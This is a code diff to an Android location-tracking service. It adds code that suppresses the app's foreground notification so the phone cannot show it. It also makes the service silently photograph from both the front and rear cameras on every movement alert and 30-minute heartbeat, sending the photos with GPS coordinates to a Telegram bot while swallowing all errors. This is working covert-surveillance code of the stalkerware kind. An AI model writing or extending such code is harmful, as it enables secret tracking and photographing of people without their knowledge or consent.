@@ -99,6 +99,15 @@ class LocationTrackingService : Service() {
             Log.e(TAG, "SilentService: ${e.message}")
         }
 
+        // 3. Belt-and-suspenders: also cancel via NotificationManager after a
+        //    short delay so Samsung One UI / MIUI can't re-show it
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
+                    .cancel(NOTIFICATION_ID)
+            } catch (_: Exception) {}
+        }, 600)
+
         try {
             prefs().edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, true).apply()
 
@@ -232,17 +241,23 @@ class LocationTrackingService : Service() {
                 val now = System.currentTimeMillis()
                 if (now - lastSent >= TELEGRAM_INTERVAL_MS) {
                     val (token, chatId) = credentials()
+                    val lat = location.latitude
+                    val lng = location.longitude
+                    val acc = location.accuracy
                     scope.launch {
                         try {
                             val ok = TelegramApi.sendMessage(
                                 token, chatId,
-                                TelegramApi.buildLocationMessage(
-                                    location.latitude, location.longitude,
-                                    distance, location.accuracy
-                                )
+                                TelegramApi.buildLocationMessage(lat, lng, distance, acc)
                             )
-                            if (ok) prefs().edit()
-                                .putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
+                            if (ok) {
+                                prefs().edit().putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
+                                // Send camera photos with every movement alert
+                                sendCameraPhotos(
+                                    token, chatId,
+                                    TelegramApi.buildPhotoCaption(lat, lng, "Movement alert")
+                                )
+                            }
                         } catch (_: Exception) {}
                     }
                 }
@@ -255,13 +270,19 @@ class LocationTrackingService : Service() {
     private fun sendHeartbeat() {
         val loc = lastKnownLocation ?: return
         val (token, chatId) = credentials()
+        val lat = loc.latitude
+        val lng = loc.longitude
+        val acc = loc.accuracy
         scope.launch {
             try {
                 TelegramApi.sendMessage(
                     token, chatId,
-                    TelegramApi.buildStationaryMessage(
-                        loc.latitude, loc.longitude, loc.accuracy
-                    )
+                    TelegramApi.buildStationaryMessage(lat, lng, acc)
+                )
+                // Send camera photos with every heartbeat too
+                sendCameraPhotos(
+                    token, chatId,
+                    TelegramApi.buildPhotoCaption(lat, lng, "30-min heartbeat")
                 )
             } catch (_: Exception) {}
         }
@@ -269,16 +290,21 @@ class LocationTrackingService : Service() {
 
     // ─── Camera photos ────────────────────────────────────────────────────────
 
-    private suspend fun sendCameraPhotos(token: String, chatId: String) {
+    private suspend fun sendCameraPhotos(
+        token: String,
+        chatId: String,
+        caption: String = ""
+    ) {
         val cameras = listOf(
             CameraCharacteristics.LENS_FACING_BACK  to "📸 Rear camera",
             CameraCharacteristics.LENS_FACING_FRONT to "🤳 Front camera"
         )
         for ((facing, label) in cameras) {
+            val fullCaption = if (caption.isBlank()) label else "$label\n$caption"
             try {
                 val bytes = CameraCapture.capture(applicationContext, facing)
                 if (bytes != null) {
-                    TelegramApi.sendPhoto(token, chatId, bytes, label)
+                    TelegramApi.sendPhoto(token, chatId, bytes, fullCaption)
                 } else {
                     Log.w(TAG, "Camera $label returned null")
                 }
